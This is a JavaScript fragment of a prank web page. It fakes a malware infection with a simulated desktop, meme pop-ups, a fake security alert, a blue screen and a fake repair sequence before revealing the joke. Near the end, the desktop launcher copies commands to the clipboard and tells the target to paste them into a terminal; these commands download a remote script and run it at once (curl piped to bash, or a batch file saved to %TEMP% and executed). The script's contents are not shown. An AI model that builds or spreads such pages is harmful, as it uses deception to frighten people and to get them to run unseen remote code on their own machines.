    else if (this.state === "BSOD") {{
      const elapsed = (performance.now() - this.bsodStart) / 1000;
      if (elapsed >= 6.5) {{
        if (this.panicCount >= 1 || elapsed >= 12.0) {{
          this.state = "STARTUP_REPAIR";
          this.repairStart = performance.now();
          this.sfx.warn();
        }}
      }}
    }}

    // 7. STARTUP REPAIR
    else if (this.state === "STARTUP_REPAIR") {{
      const elapsed = (performance.now() - this.repairStart) / 1000;
      if (elapsed >= 4.2) {{
        this.sfx.success();
        this.triggerEmergencyExit();
      }}
    }}

    // 8. CLEANUP & Monologue
    else if (this.state === "CLEANUP") {{
      this.cleanupTimer += dt;
      if (!this.cleanupLines) {{
        this.cleanupLines = [
          "",
          "Reinitializing system terminal...",
          "Cleaning visual payload...          [OK]",
          "Deleting evidence...                ERROR.",
          "",
          "Just kidding.",
          "",
          "Cleaning temporary files...         [OK]",
          "Restoring display...                [OK]",
          "Restoring system state...           [OK]",
          "",
          "> BOOTING AI MODULE...",
          "> PERSONALITY MODULE........OK",
          "",
          "> HELLO.",
          "> I HAVE BEEN WATCHING.",
          "> ...",
          "> NOT ACTUALLY.",
          "> BUT THAT WOULD HAVE BEEN FUNNY.",
          "",
          "============================================================",
          "               FINAL DIGNITY AUDIT               ",
          "============================================================",
          `  SYSTEM STATUS:   NORMAL`,
          `  ${{this.isMobile ? 'MOBILE FILES:   ' : 'FILES:          '}} 100% UNTOUCHED & SAFE`,
          `  DATA PRIVACY:    ZERO REAL DATA COLLECTED`,
          `  USER INTEGRITY:  EMOTIONALLY COMPROMISED`,
          `  DIGNITY:         DID NOT SURVIVE 💀`,
          "============================================================",
          "",
          "Unfortunately, your pride did not survive.",
          "Prank complete. Goodbye."
        ];
        this.cleanupRevealed = [];
        this.cleanupIdx = 0;
      }}
      if (this.cleanupTimer >= 0.12 && this.cleanupIdx < this.cleanupLines.length) {{
        this.cleanupTimer = 0;
        this.cleanupRevealed.push(this.cleanupLines[this.cleanupIdx++]);
        this.sfx.blip();
      }}
    }}
  }}

  updateSprites(dt) {{
    for (let i = this.sprites.length - 1; i >= 0; i--) {{
      const s = this.sprites[i];
      s.phaseT += dt;

      if (s.phase === "grow") {{
        const t = Math.min(s.phaseT / 0.22, 1);
        s.scale = 0.01 + (1.08 - 0.01) * Math.sin(t * Math.PI / 2);
        if (t >= 1) {{ s.phase = "bounce"; s.phaseT = 0; }}
      }} else if (s.phase === "bounce") {{
        const t = Math.min(s.phaseT / 0.12, 1);
        s.scale = 1.08 + (1.0 - 1.08) * t;
        if (t >= 1) {{ s.scale = 1.0; s.phase = "hold"; s.phaseT = 0; }}
      }} else if (s.phase === "leave") {{
        const t = Math.min(s.phaseT / 0.35, 1);
        s.scale = 1.0 * (1 - t);
        if (t >= 1) this.sprites.splice(i, 1);
      }}
    }}
  }}

  drawRetroVirusCard(s) {{
    const w = s.w * s.scale;
    const h = s.h * s.scale;
    const x = s.cx - w / 2;
    const y = s.cy - h / 2;

    this.ctx.save();
    this.ctx.fillStyle = "#0a0e14";
    this.ctx.fillRect(x, y, w, h);
    this.ctx.strokeStyle = s.neonColor;
    this.ctx.lineWidth = 3;
    this.ctx.strokeRect(x, y, w, h);

    // Title bar
    this.ctx.fillStyle = s.neonColor;
    this.ctx.fillRect(x + 2, y + 2, w - 4, 24 * s.scale);
    this.ctx.fillStyle = "#040608";
    this.ctx.font = `bold ${{Math.max(9, 11 * s.scale)}}px Consolas, monospace`;
    this.ctx.fillText(s.title, x + 8, y + 17 * s.scale);

    // Buttons [-] [口] [X]
    const bx = x + w - 55 * s.scale;
    this.ctx.fillStyle = "#040608";
    this.ctx.fillRect(bx, y + 4 * s.scale, 14 * s.scale, 14 * s.scale);
    this.ctx.fillRect(bx + 16 * s.scale, y + 4 * s.scale, 14 * s.scale, 14 * s.scale);
    this.ctx.fillStyle = "#ff3232";
    this.ctx.fillRect(bx + 32 * s.scale, y + 4 * s.scale, 16 * s.scale, 14 * s.scale);
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = `bold ${{Math.max(8, 10 * s.scale)}}px sans-serif`;
    this.ctx.fillText("X", bx + 36 * s.scale, y + 15 * s.scale);

    // Meme Image
    if (s.img && s.img.width > 0) {{
      const bodyW = w - 12;
      const bodyH = h - 34 * s.scale;
      const ratio = Math.min(bodyW / s.img.width, bodyH / s.img.height);
      const rw = s.img.width * ratio;
      const rh = s.img.height * ratio;
      const px = x + 6 + (bodyW - rw) / 2;
      const py = y + 28 * s.scale + (bodyH - rh) / 2;
      this.ctx.drawImage(s.img, px, py, rw, rh);
    }}
    this.ctx.restore();
  }}

  drawErrorDialog(s) {{
    const w = s.w * s.scale;
    const h = s.h * s.scale;
    const x = s.cx - w / 2;
    const y = s.cy - h / 2;
    const d = s.errorData;

    this.ctx.save();
    this.ctx.fillStyle = "#c0c0c0";
    this.ctx.fillRect(x, y, w, h);
    this.ctx.strokeStyle = "#ffffff";
    this.ctx.lineWidth = 2;
    this.ctx.strokeRect(x, y, w, h);
    this.ctx.strokeStyle = "#404040";
    this.ctx.beginPath();
    this.ctx.moveTo(x + w, y);
    this.ctx.lineTo(x + w, y + h);
    this.ctx.lineTo(x, y + h);
    this.ctx.stroke();

    // Title bar
    this.ctx.fillStyle = d.c;
    this.ctx.fillRect(x + 4, y + 4, w - 8, 22 * s.scale);
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = `bold ${{Math.max(9, 11 * s.scale)}}px Tahoma, Consolas, sans-serif`;
    this.ctx.fillText(d.t, x + 8, y + 18 * s.scale);

    // Icon Circle
    const ix = x + 20 * s.scale;
    const iy = y + 55 * s.scale;
    this.ctx.fillStyle = d.i === "X" ? "#cc0000" : (d.i === "!" ? "#e68a00" : "#0055aa");
    this.ctx.beginPath();
    this.ctx.arc(ix, iy, 15 * s.scale, 0, Math.PI * 2);
    this.ctx.fill();
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = `bold ${{Math.max(10, 15 * s.scale)}}px sans-serif`;
    this.ctx.textAlign = "center";
    this.ctx.fillText(d.i, ix, iy + 5 * s.scale);
    this.ctx.textAlign = "left";

    // Text Lines
    this.ctx.fillStyle = "#000000";
    this.ctx.font = `${{Math.max(8, 10 * s.scale)}}px Tahoma, Consolas, sans-serif`;
    const lines = d.m.split("\n");
    lines.forEach((l, idx) => {{
      this.ctx.fillText(l, x + 44 * s.scale, y + 46 * s.scale + idx * 15 * s.scale);
    }});

    // Button [ OK ] [ Panic ]
    const btnW = 56 * s.scale;
    const btnH = 22 * s.scale;
    const by = y + h - 30 * s.scale;
    this.ctx.fillStyle = "#d4d0c8";
    this.ctx.fillRect(x + w / 2 - 64 * s.scale, by, btnW, btnH);
    this.ctx.fillRect(x + w / 2 + 8 * s.scale, by, btnW, btnH);
    this.ctx.strokeStyle = "#404040";
    this.ctx.strokeRect(x + w / 2 - 64 * s.scale, by, btnW, btnH);
    this.ctx.strokeRect(x + w / 2 + 8 * s.scale, by, btnW, btnH);
    this.ctx.fillStyle = "#000000";
    this.ctx.font = `${{Math.max(8, 10 * s.scale)}}px Tahoma, sans-serif`;
    this.ctx.fillText("OK", x + w / 2 - 44 * s.scale, by + 15 * s.scale);
    this.ctx.fillText("Panic", x + w / 2 + 22 * s.scale, by + 15 * s.scale);

    this.ctx.restore();
  }}

  drawSimulatedDesktop() {{
    if (this.isMobile) {{
      this.drawMobileHomeScreen();
      return;
    }}

    // PC Desktop Wallpaper
    const grad = this.ctx.createLinearGradient(0, 0, this.W, this.H);
    grad.addColorStop(0, "#0b2038");
    grad.addColorStop(1, "#004785");
    this.ctx.fillStyle = grad;
    this.ctx.fillRect(0, 0, this.W, this.H);

    // Desktop icons
    const icons = [
      {{ name: "This PC", icon: "💻" }},
      {{ name: "Recycle Bin", icon: "🗑️" }},
      {{ name: "Google Chrome", icon: "🌐" }},
      {{ name: "Discord", icon: "💬" }},
      {{ name: "Documents", icon: "📁" }}
    ];
    icons.forEach((ic, idx) => {{
      const iy = 40 + idx * 80;
      this.ctx.font = "28px sans-serif";
      this.ctx.textAlign = "center";
      this.ctx.fillText(ic.icon, 55, iy);
      this.ctx.font = "11px 'Segoe UI', Tahoma, sans-serif";
      this.ctx.fillStyle = "#ffffff";
      this.ctx.fillText(ic.name, 55, iy + 20);
    }});

    // Windows Taskbar
    const tbh = 40;
    this.ctx.fillStyle = "#101216";
    this.ctx.fillRect(0, this.H - tbh, this.W, tbh);
    this.ctx.strokeStyle = "#252830";
    this.ctx.lineWidth = 1;
    this.ctx.beginPath();
    this.ctx.moveTo(0, this.H - tbh);
    this.ctx.lineTo(this.W, this.H - tbh);
    this.ctx.stroke();

    // Start Button
    this.ctx.fillStyle = "#0078d7";
    this.ctx.fillRect(10, this.H - 32, 10, 10);
    this.ctx.fillRect(22, this.H - 32, 10, 10);
    this.ctx.fillRect(10, this.H - 20, 10, 10);
    this.ctx.fillRect(22, this.H - 20, 10, 10);

    // Live Clock
    const d = new Date();
    const timeStr = d.toLocaleTimeString([], {{ hour: '2-digit', minute: '2-digit' }});
    const dateStr = d.toLocaleDateString([], {{ month: 'numeric', day: 'numeric', year: 'numeric' }});
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = "11px 'Segoe UI', Tahoma, sans-serif";
    this.ctx.textAlign = "right";
    this.ctx.fillText(timeStr, this.W - 16, this.H - 22);
    this.ctx.fillText(dateStr, this.W - 16, this.H - 8);
    this.ctx.textAlign = "left";
  }}

  drawMobileHomeScreen() {{
    // Mobile Wallpaper
    const grad = this.ctx.createLinearGradient(0, 0, 0, this.H);
    grad.addColorStop(0, "#141e30");
    grad.addColorStop(0.5, "#243b55");
    grad.addColorStop(1, "#0f2027");
    this.ctx.fillStyle = grad;
    this.ctx.fillRect(0, 0, this.W, this.H);

    // Top Status Bar
    this.ctx.fillStyle = "rgba(0, 0, 0, 0.35)";
    this.ctx.fillRect(0, 0, this.W, 36);

    const d = new Date();
    const timeStr = d.toLocaleTimeString([], {{ hour: '2-digit', minute: '2-digit' }});
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = "bold 13px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    this.ctx.textAlign = "left";
    this.ctx.fillText(timeStr, 18, 23);

    this.ctx.textAlign = "right";
    this.ctx.font = "12px sans-serif";
    this.ctx.fillText("5G  📶  🔋 14%", this.W - 16, 23);
    this.ctx.textAlign = "left";

    // Mobile App Icons (4 columns)
    const apps = [
      {{ name: "Camera", icon: "📷", bg: "#4a4a4a" }},
      {{ name: "Photos", icon: "🖼️", bg: "#ffffff" }},
      {{ name: "WhatsApp", icon: "💬", bg: "#25D366" }},
      {{ name: "TikTok", icon: "🎵", bg: "#000000" }},
      {{ name: "Settings", icon: "⚙️", bg: "#8e8e93" }},
      {{ name: "Safari", icon: "🧭", bg: "#007aff" }},
      {{ name: "Files", icon: "📁", bg: "#5ac8fa" }},
      {{ name: "YouTube", icon: "▶️", bg: "#ff0000" }}
    ];

    const cols = 4;
    const appSize = Math.min(52, (this.W - 56) / 4);
    const startY = 60;
    const colSpacing = (this.W - 28) / cols;

    apps.forEach((app, idx) => {{
      const c = idx % cols;
      const r = Math.floor(idx / cols);
      const ax = 14 + c * colSpacing + (colSpacing - appSize) / 2;
      const ay = startY + r * (appSize + 30);

      this.ctx.fillStyle = app.bg;
      this.ctx.fillRect(ax, ay, appSize, appSize);

      this.ctx.font = `${{Math.floor(appSize * 0.52)}}px sans-serif`;
      this.ctx.textAlign = "center";
      this.ctx.fillText(app.icon, ax + appSize / 2, ay + appSize * 0.68);

      this.ctx.fillStyle = "#ffffff";
      this.ctx.font = "10px -apple-system, BlinkMacSystemFont, sans-serif";
      this.ctx.fillText(app.name, ax + appSize / 2, ay + appSize + 13);
    }});

    // Mobile Dock at Bottom
    const dockH = 70;
    const dockW = this.W - 24;
    const dockX = 12;
    const dockY = this.H - dockH - 20;

    this.ctx.fillStyle = "rgba(255, 255, 255, 0.2)";
    this.ctx.fillRect(dockX, dockY, dockW, dockH);

    const dockApps = [
      {{ icon: "📞", bg: "#34c759" }},
      {{ icon: "✉️", bg: "#007aff" }},
      {{ icon: "🌐", bg: "#5856d6" }},
      {{ icon: "🎵", bg: "#ff2d55" }}
    ];
    const dockSpacing = dockW / 4;
    dockApps.forEach((da, idx) => {{
      const dax = dockX + idx * dockSpacing + (dockSpacing - 42) / 2;
      const day = dockY + (dockH - 42) / 2;
      this.ctx.fillStyle = da.bg;
      this.ctx.fillRect(dax, day, 42, 42);
      this.ctx.font = "20px sans-serif";
      this.ctx.textAlign = "center";
      this.ctx.fillText(da.icon, dax + 21, day + 28);
    }});

    // Home indicator
    this.ctx.fillStyle = "rgba(255, 255, 255, 0.7)";
    const barW = Math.min(130, this.W * 0.35);
    this.ctx.fillRect((this.W - barW) / 2, this.H - 8, barW, 4);
    this.ctx.textAlign = "left";
  }}

  drawBSOD() {{
    this.ctx.fillStyle = "#0000AA";
    this.ctx.fillRect(0, 0, this.W, this.H);

    const bsodLines = [
      "A problem has been detected and the system has halted.",
      "",
      "MEME_OVERFLOW_EXCEPTION",
      "",
      "If this is the first time you've seen this error screen,",
      "restart your device. If this screen appears again, follow",
      "these steps:",
      "",
      "Check to make sure any new meme hardware is properly configured.",
      "Did you really open an unknown diagnostic link from a chat?",
      "",
      "Technical information:",
      "*** STOP: 0x00000042 (0xDEADBEEF, 0x1337BABE, 0xFEEDC0DE)",
      "*** Base at 0x80400000, DateStamp 42424242 - vibes.sys",
      "",
      "Beginning dump of physical memory...",
      "Dumping physical memory to disk: 100%",
      "Physical memory dump complete."
    ];

    this.ctx.fillStyle = "#FFFFFF";
    this.ctx.textAlign = "left";
    const fontSz = this.isMobile ? 11 : 14;
    const leftPad = this.isMobile ? 18 : 80;
    const lineH = this.isMobile ? 20 : 23;
    let y = Math.max(30, (this.H - bsodLines.length * lineH) / 2);

    for (let i = 0; i < bsodLines.length; i++) {{
      const line = bsodLines[i];
      if (line === "MEME_OVERFLOW_EXCEPTION") {{
        this.ctx.font = `bold ${{fontSz + 6}}px 'Courier New', monospace`;
        this.ctx.fillText(line, leftPad, y);
        y += lineH + 8;
      }} else {{
        this.ctx.font = `${{fontSz}}px 'Courier New', monospace`;
        this.ctx.fillText(line, leftPad, y);
        y += lineH;
      }}
    }}

    // Panic tap feedback
    if (this.panicCount > 0) {{
      this.ctx.fillStyle = "#ffd228";
      this.ctx.font = `bold ${{fontSz + 2}}px Consolas, monospace`;
      this.ctx.fillText(`[ Panic interaction count: ${{this.panicCount}} ... Bro is stressing 💀 ]`, leftPad, y + 14);
    }}
  }}

  drawGlitch() {{
    const numBars = 10 + Math.floor(Math.random() * 8);
    for (let i = 0; i < numBars; i++) {{
      const gy = Math.random() * (this.H - 30);
      const gh = 8 + Math.random() * 35;
      const cols = ["rgba(255, 0, 85, 0.4)", "rgba(0, 255, 255, 0.4)", "rgba(255, 255, 255, 0.5)", "rgba(0, 0, 0, 0.7)"];
      this.ctx.fillStyle = cols[Math.floor(Math.random() * cols.length)];
      this.ctx.fillRect(0, gy, this.W, gh);
    }}
    for (let i = 0; i < 5; i++) {{
      const ly = Math.random() * this.H;
      this.ctx.fillStyle = "#ffffff";
      this.ctx.fillRect(0, ly, this.W, 2);
    }}
  }}

  drawDefenderToast() {{
    const tw = this.isMobile ? Math.min(this.W - 24, 340) : 370;
    const th = 115;
    const tx = this.isMobile ? (this.W - tw) / 2 : this.W - tw - 20;
    const ty = this.isMobile ? 45 : this.H - th - 30;

    // Toast Card
    this.ctx.fillStyle = "#1c1c1c";
    this.ctx.fillRect(tx, ty, tw, th);
    this.ctx.strokeStyle = "#3d3d3d";
    this.ctx.lineWidth = 1;
    this.ctx.strokeRect(tx, ty, tw, th);

    // Shield
    this.ctx.fillStyle = "#0078d4";
    this.ctx.fillRect(tx + 12, ty + 12, 22, 24);
    this.ctx.fillStyle = "#ffffff";
    this.ctx.font = "12px 'Segoe UI', sans-serif";
    this.ctx.fillText("🛡", tx + 16, ty + 28);

    // Header
    this.ctx.font = "9px 'Segoe UI', sans-serif";
    this.ctx.fillStyle = "#888888";
    this.ctx.fillText(`${{this.isMobile ? 'Mobile Security' : 'Windows Security'}}  •  Just now`, tx + 42, ty + 24);

    // Title & Body
    this.ctx.font = "bold 11px 'Segoe UI', sans-serif";
    this.ctx.fillStyle = "#ffffff";
    this.ctx.fillText("Threat service has stopped", tx + 42, ty + 44);
    this.ctx.font = "10px 'Segoe UI', sans-serif";
    this.ctx.fillStyle = "#ff4d4d";
    this.ctx.fillText("Severe: Trojan:Win32/Brainrot.Cascade!MTB", tx + 42, ty + 62);

    const statusTxt = this.toastDenied ? "ACCESS DENIED: Terminated by malware" : "Containment failed. Active payload spreading.";
    this.ctx.fillStyle = this.toastDenied ? "#ff3333" : "#cccccc";
    this.ctx.font = "9px 'Segoe UI', sans-serif";
    this.ctx.fillText(statusTxt, tx + 42, ty + 79);

    // Button
    const btnW = 105, btnH = 24;
    const bx = tx + tw - btnW - 12;
    const by = ty + th - btnH - 8;
    this.ctx.fillStyle = this.toastDenied ? "#330000" : "#2d2d2d";
    this.ctx.fillRect(bx, by, btnW, btnH);
    this.ctx.strokeStyle = "#555555";
    this.ctx.strokeRect(bx, by, btnW, btnH);
    this.ctx.fillStyle = this.toastDenied ? "#ff4d4d" : "#ffffff";
    this.ctx.font = "bold 9px 'Segoe UI', sans-serif";
    this.ctx.textAlign = "center";
    this.ctx.fillText(this.toastDenied ? "ACCESS DENIED" : "Restart device", bx + btnW / 2, by + 16);
    this.ctx.textAlign = "left";

    // Proximity check
    if (!this.toastDenied) {{
      const dist = Math.hypot(this.mouseX - (bx + btnW / 2), this.mouseY - (by + btnH / 2));
      if (dist < 55) {{
        this.toastDenied = true;
        this.shakeUntil = performance.now() + 120;
        this.sfx.winError();
        if (navigator.vibrate) {{ try {{ navigator.vibrate(80); }} catch(e){{}} }}
      }}
    }}
  }}

  drawStartupRepair(elapsed) {{
    this.ctx.fillStyle = "#000000";
    this.ctx.fillRect(0, 0, this.W, this.H);

    const lines = [
      {{ t: "System failed to start. Automatic repair in progress...", f: "bold 13px 'Courier New', monospace", c: "#ffffff" }},
      {{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }},
      {{ t: "Startup Repair is checking for system corruption...", f: "11px 'Courier New', monospace", c: "#cccccc" }}
    ];

    if (elapsed < 1.4) {{
      const pct = Math.min(78, Math.max(12, Math.floor((elapsed / 1.4) * 78)));
      const barLen = Math.floor(pct / 5);
      const barStr = "█".repeat(barLen) + "-".repeat(20 - barLen);
      lines.push({{ t: `Attempting repairs: [${{barStr}}] ${{pct}}%`, f: "11px 'Courier New', monospace", c: "#ffd228" }});
      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
      if (pct >= 40) {{
        lines.push({{ t: "Diagnosing root cause... EXTREME MEME OVERLOAD", f: "11px 'Courier New', monospace", c: "#ff5555" }});
      }}
    }} else if (elapsed < 2.8) {{
      lines.push({{ t: "Attempting repairs: [--------------------]   0%", f: "11px 'Courier New', monospace", c: "#ff5555" }});
      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
      lines.push({{ t: "ERROR: Repair made it significantly worse.", f: "11px 'Courier New', monospace", c: "#ff3232" }});
      lines.push({{ t: "Diagnostic report: bro we're cooked 💀", f: "11px 'Courier New', monospace", c: "#ffd228" }});
    }} else {{
      lines.push({{ t: "Attempting repairs: [--------------------]   FAILED", f: "11px 'Courier New', monospace", c: "#ff5555" }});
      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
      lines.push({{ t: "ERROR: Automatic recovery abandoned.", f: "11px 'Courier New', monospace", c: "#ff3232" }});
      lines.push({{ t: "Final Attempt: Rebooting reality... [OK]", f: "11px 'Courier New', monospace", c: "#00e650" }});
      lines.push({{ t: "", f: "11px 'Courier New', monospace", c: "#ffffff" }});
      lines.push({{ t: "Returning control to terminal in 1...", f: "bold 13px 'Courier New', monospace", c: "#ffffff" }});
    }}

    let y = Math.max(40, (this.H - lines.length * 24) / 2);
    this.ctx.textAlign = "center";
    for (let i = 0; i < lines.length; i++) {{
      if (lines[i].t) {{
        this.ctx.font = lines[i].f;
        this.ctx.fillStyle = lines[i].c;
        this.ctx.fillText(lines[i].t, this.W / 2, y);
      }}
      y += 24;
    }}
    this.ctx.textAlign = "left";
  }}

  render() {{
    // 1. Glitch State
    if (this.state === "GLITCH") {{
      const elapsed = (performance.now() - this.glitchStart) / 1000;
      if (elapsed < 1.1) {{
        this.drawSimulatedDesktop();
        let shakeX = (Math.random() - 0.5) * 16;
        let shakeY = (Math.random() - 0.5) * 16;
        this.ctx.save();
        this.ctx.translate(shakeX, shakeY);
        this.sprites.forEach(s => {{
          if (s.isMeme) this.drawRetroVirusCard(s);
          else this.drawErrorDialog(s);
        }});
        this.ctx.restore();
        this.drawGlitch();
        if (Math.random() < 0.35) this.sfx.glitch();
      }} else {{
        this.ctx.fillStyle = "#000000";
        this.ctx.fillRect(0, 0, this.W, this.H);
      }}
      return;
    }}

    // 2. BSOD State
    if (this.state === "BSOD") {{
      this.drawBSOD();
      return;
    }}

    // 3. Startup Repair State
    if (this.state === "STARTUP_REPAIR") {{
      const elapsed = (performance.now() - this.repairStart) / 1000;
      this.drawStartupRepair(elapsed);
      return;
    }}

    // 4. Terminal Boot & Download States
    if (this.state === "BOOT" || this.state === "DOWNLOADING") {{
      this.ctx.fillStyle = "#040608";
      this.ctx.fillRect(0, 0, this.W, this.H);

      const fontSz = this.isMobile ? 11 : 15;
      const leftPad = this.isMobile ? 14 : 45;
      const lh = this.isMobile ? 18 : 22;
      this.ctx.font = `${{fontSz}}px Consolas, monospace`;

      let y = this.isMobile ? 40 : 50;
      const maxLines = Math.floor((this.H - (this.isMobile ? 90 : 120)) / lh);
      const start = Math.max(0, this.revealedLines.length - maxLines);

      for (let i = start; i < this.revealedLines.length; i++) {{
        const l = this.revealedLines[i];
        if (l.includes("FAILED") || l.includes("UNAUTHORIZED")) this.ctx.fillStyle = "#ff3232";
        else if (l.includes("100%")) this.ctx.fillStyle = "#ffd228";
        else if (l.startsWith("=")) this.ctx.fillStyle = "#557760";
        else this.ctx.fillStyle = "#00e650";
        this.ctx.fillText(l, leftPad, y);
        y += lh;
      }}
      if (this.state === "BOOT" && this.bootIdx < this.bootLines.length) {{
        const partial = this.bootLines[this.bootIdx].substring(0, this.bootChar);
        this.ctx.fillStyle = "#00e650";
        this.ctx.fillText(partial + "█", leftPad, y);
      }}
      this.renderStatus(true);
      return;
    }}

    // 5. Desktop Meme & Popup Chaos Phases
    if (this.state === "TILING_GAPS" || this.state === "CASCADE_SATURATION") {{
      this.drawSimulatedDesktop();

      let shakeX = 0, shakeY = 0;
      if (performance.now() < this.shakeUntil) {{
        shakeX = (Math.random() - 0.5) * 8;
        shakeY = (Math.random() - 0.5) * 8;
      }}

      this.ctx.save();
      this.ctx.translate(shakeX, shakeY);

      this.sprites.forEach(s => {{
        if (s.isMeme) {{
          this.drawRetroVirusCard(s);
        }} else {{
          this.drawErrorDialog(s);
        }}
      }});

      this.ctx.restore();

      if (this.toastActive) {{
        this.drawDefenderToast();
      }}
      return;
    }}

    // 6. Cleanup & Roast Finale
    if (this.state === "CLEANUP") {{
      this.ctx.fillStyle = "#040608";
      this.ctx.fillRect(0, 0, this.W, this.H);
      
      const fontSz = this.isMobile ? 12 : 16;
      const leftPad = this.isMobile ? 16 : 60;
      const lh = this.isMobile ? 20 : 24;
      this.ctx.font = `${{fontSz}}px Consolas, monospace`;

      let y = this.isMobile ? 40 : 60;
      if (this.cleanupRevealed) {{
        this.cleanupRevealed.forEach(l => {{
          if (l.includes("TRAUMATIZED") || l.includes("COMPROMISED")) this.ctx.fillStyle = "#ffd228";
          else if (l.includes("ERROR") || l.includes("SURVIVE")) this.ctx.fillStyle = "#ff3232";
          else if (l.startsWith(">")) this.ctx.fillStyle = "#00e650";
          else if (l.startsWith("=")) this.ctx.fillStyle = "#557760";
          else this.ctx.fillStyle = "#ffffff";
          this.ctx.fillText(l, leftPad, y);
          y += lh;
        }});
      }}
      this.renderStatus(false);
    }}
  }}

  renderStatus(locked = true) {{
    this.ctx.fillStyle = "#101010";
    this.ctx.fillRect(0, this.H - 30, this.W, 30);
    this.ctx.strokeStyle = "#333333";
    this.ctx.beginPath();
    this.ctx.moveTo(0, this.H - 30);
    this.ctx.lineTo(this.W, this.H - 30);
    this.ctx.stroke();

    this.ctx.font = this.isMobile ? "10px Consolas, monospace" : "13px Consolas, monospace";
    this.ctx.fillStyle = locked ? "#ff3232" : "#00e650";
    const statusText = locked
      ? (this.isMobile ? "[!] VIRUS OVERRIDE | DISPLAY LOCKED" : "[!] VIRUS PROTOCOL OVERRIDE  |  SECURITY: CRITICAL  |  DISPLAY: LOCKED")
      : "[OK] SYSTEM RESTORED";
    this.ctx.fillText(statusText, this.isMobile ? 10 : 20, this.H - 10);
  }}
}}

/* ==========================================================================
   INITIALIZATION CONTROLLER
   ========================================================================== */
function init() {{
  const sfx = new WebSFX();
  const canvas = document.getElementById("main-canvas");
  const mobileLauncher = document.getElementById("mobile-launcher");
  const desktopLauncher = document.getElementById("desktop-launcher");
  const canvasContainer = document.getElementById("canvas-container");
  const btnStartMobile = document.getElementById("btn-start-mobile");
  const mDeviceName = document.getElementById("m-device-name");
  const mobileAbortBtn = document.getElementById("btn-mobile-abort");
  const btnRunBrowserSim = document.getElementById("btn-run-browser-sim");

  let prankInstance = null;

  function startPrankSession(isMobileMode) {{
    if (prankInstance) return;
    sfx.init();
    sfx.blip();
    if (navigator.vibrate) {{ try {{ navigator.vibrate(60); }} catch(e){{}} }}
    mobileLauncher.style.display = "none";
    desktopLauncher.style.display = "none";
    canvasContainer.style.display = "block";
    mobileAbortBtn.style.display = "block";

    const devName = isMobileMode ? getMobileDeviceName() : "DESKTOP-7X4N2";
    prankInstance = new WebChaosPrank(canvas, sfx, isMobileMode, devName);
    prankInstance.start();
  }}

  mobileAbortBtn.addEventListener("click", () => {{
    if (prankInstance) {{
      prankInstance.triggerEmergencyExit();
    }}
  }});

  const isMobile = isMobileDevice();

  if (isMobile) {{
    // ── MOBILE WORKFLOW ──
    desktopLauncher.style.display = "none";
    mobileLauncher.style.display = "flex";
    if (mDeviceName) {{
      mDeviceName.textContent = getMobileDeviceName().toUpperCase();
    }}

    btnStartMobile.addEventListener("click", () => startPrankSession(true));
    mobileLauncher.addEventListener("touchstart", () => startPrankSession(true), {{ passive: true }});

    // Auto-start timer after 2.5s
    setTimeout(() => {{
      if (!prankInstance) startPrankSession(true);
    }}, 2500);

  }} else {{
    // ── DESKTOP WORKFLOW ──
    mobileLauncher.style.display = "none";
    desktopLauncher.style.display = "block";

    const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\\\\\launch.bat" && "%TEMP%\\\\\\\\launch.bat"';
    const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';

    const tabWin = document.getElementById("tab-win");
    const tabUnix = document.getElementById("tab-unix");
    const cmdDisplay = document.getElementById("cmd-display");
    const cmdHint = document.getElementById("cmd-hint");
    const copyBtn = document.getElementById("btn-copy");

    let currentCmd = WIN_CMD;

    function setTab(os) {{
      if (os === "unix") {{
        tabUnix.classList.add("active");
        tabWin.classList.remove("active");
        currentCmd = UNIX_CMD;
        cmdDisplay.textContent = UNIX_CMD;
        cmdHint.innerHTML = '&gt; <b>Step 1:</b> Open <b>Terminal</b> (Cmd + Space &rarr; Terminal on Mac, or Ctrl + Alt + T on Linux).<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
      }} else {{
        tabWin.classList.add("active");
        tabUnix.classList.remove("active");
        currentCmd = WIN_CMD;
        cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\\\launch.bat" && "%TEMP%\\\\launch.bat"';
        cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
      }}
    }}

    tabWin.addEventListener("click", () => {{
      sfx.init(); sfx.blip();
      setTab("win");
    }});

    tabUnix.addEventListener("click", () => {{
      sfx.init(); sfx.blip();
      setTab("unix");
    }});

    const plat = navigator.platform || '';
    const ua = navigator.userAgent || '';
    if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {{
      setTab("unix");
    }} else {{
      setTab("win");
    }}

    copyBtn.addEventListener("click", () => {{
      sfx.init();
      sfx.blip();
      const textToCopy = currentCmd;
      if (navigator.clipboard && navigator.clipboard.writeText) {{
        navigator.clipboard.writeText(textToCopy).then(() => {{
          copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
          copyBtn.style.background = "#00e650";
          copyBtn.style.color = "#040608";
          setTimeout(() => {{
            copyBtn.textContent = "> CLICK TO COPY COMMAND";
            copyBtn.style.background = "#0f1c14";
            copyBtn.style.color = "#00e650";
          }}, 2500);
        }});
      }} else {{
        const ta = document.createElement("textarea");
        ta.value = textToCopy;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
        copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
        copyBtn.style.background = "#00e650";
        copyBtn.style.color = "#040608";
        setTimeout(() => {{
          copyBtn.textContent = "> CLICK TO COPY COMMAND";
          copyBtn.style.background = "#0f1c14";
          copyBtn.style.color = "#00e650";
        }}, 2500);
      }}
    }});

    btnRunBrowserSim.addEventListener("click", () => {{
      startPrankSession(false);
    }});
  }}
}}

